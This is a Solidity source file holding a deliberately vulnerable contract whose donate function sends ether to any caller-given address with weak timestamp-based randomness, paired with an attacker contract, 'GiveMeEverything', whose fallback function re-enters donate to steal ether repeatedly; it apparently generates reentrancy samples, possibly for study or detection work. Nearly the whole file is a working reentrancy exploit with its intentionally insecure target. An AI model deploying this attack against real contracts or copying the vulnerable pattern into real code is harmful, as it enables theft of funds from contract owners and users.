pragma solidity ^0.4.0;


// I need 30 ethers for each tx :: one pair should be deployed for each


contract Vulnerable {
    uint public noReasonCounter = 0;
    
    uint public a = 0;
    uint public b = 0;
    uint public c = 0;
    uint public d_binary = 0;
    uint public amount;
    
    
    function random_binary() private view returns (uint8) {
        return uint8(uint256(keccak256(block.timestamp, block.difficulty))%2);
    }
    
    function random(uint num) private view returns (uint8) {
        return uint8(uint256(keccak256(block.timestamp, block.difficulty))%num);
    }
    
    
    constructor() public payable {
        
    }
    
    function donate(address to_) public payable {
        
        d_binary = random_binary();
        c = random(10);
        if (d_binary == 1) {
            for (uint i = 0; i < c; i++) {
                noReasonCounter++;
            }
        }
        
        
        
        amount = random(10) * 500000000000000000;
        require(to_.call.value(amount)());
    } 
    
    
    
}




// I need no ether to attack

contract GiveMeEverything {
    Vulnerable public gv;
    uint64 public theif_counter;
    
    
    uint public a = 0;
    uint public e = 0;
    uint public f = 0;
    uint public b_binary = 0;
    uint public c_binary = 0;
    uint public d_binary = 0;
    
    uint public counter = 0;
    
    constructor() payable {
        
    }
    
    
    
    function random_binary() private view returns (uint8) {
        return uint8(uint256(keccak256(block.timestamp, block.difficulty))%2);
    }
    
    function random(uint num) private view returns (uint8) {
        return uint8(uint256(keccak256(block.timestamp, block.difficulty))%num);
    }
    
    
    function A() public {
        counter++;
        for (uint i = 0; i < e; i++) {
            counter++;
        }
    }
    
    
    
    function startAttack(address _addr) public {
        a = random(14);
        e = random(10);
        b_binary = random_binary();
        
        if (b_binary == 1) {
            A();
        }
        
        gv = Vulnerable(_addr);
        
        theif_counter = 0;
        theif_counter++;
        
        gv.donate(address(this));
    }
    
    
    function() public payable {
        
        // tries to steal a limited times to that the attack is successful (does not drain the resources)
        
        if (theif_counter > 2) {
            if (theif_counter <= a) {
                theif_counter++;
                gv.donate(address(this));
            }
        } else {
            theif_counter++;
            gv.donate(address(this));
        }
        
    }
    
    
    /*
    function startAttack(address _addr) public {
      
        gv = GenericVulnerable(_addr);
        
        theif_counter = 0;
        theif_counter++;
        
        gv.donate(address(this));
    }
    
    function() public payable {
        
        // tries to steal a limited times to that the attack is successful (does not drain the resources)
        if (theif_counter <= 6) {
            theif_counter++;
            gv.donate(address(this));
        }
        
        
    }
    */
    
}